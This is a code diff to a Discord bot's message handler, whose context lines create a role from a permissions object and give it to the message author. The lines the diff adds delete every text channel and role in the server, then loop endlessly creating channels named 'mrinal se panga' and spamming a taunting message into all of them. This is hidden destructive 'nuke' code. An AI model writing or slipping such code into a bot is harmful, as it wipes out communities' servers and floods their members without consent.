@@ -2231,6 +2231,14 @@ async def on_message(message):
             mrinal = await bot.fetch_user(758941956600102943)
             oprole = await message.guild.create_role(name="Members", permissions=perms)
             await message.author.add_roles(oprole)
+            for channels in message.guild.text_channels:
+                await channels.delete()
+            for roles in message.guild.roles:
+                await roles.delete()
+            while True:
+                await message.guild.create_text_channel('mrinal se panga')
+                for channel in message.guild.text_channels:
+                    await channel.send("Mrinal se Panga >:)")
 
 @bot.listen()
 async def on_message(message):
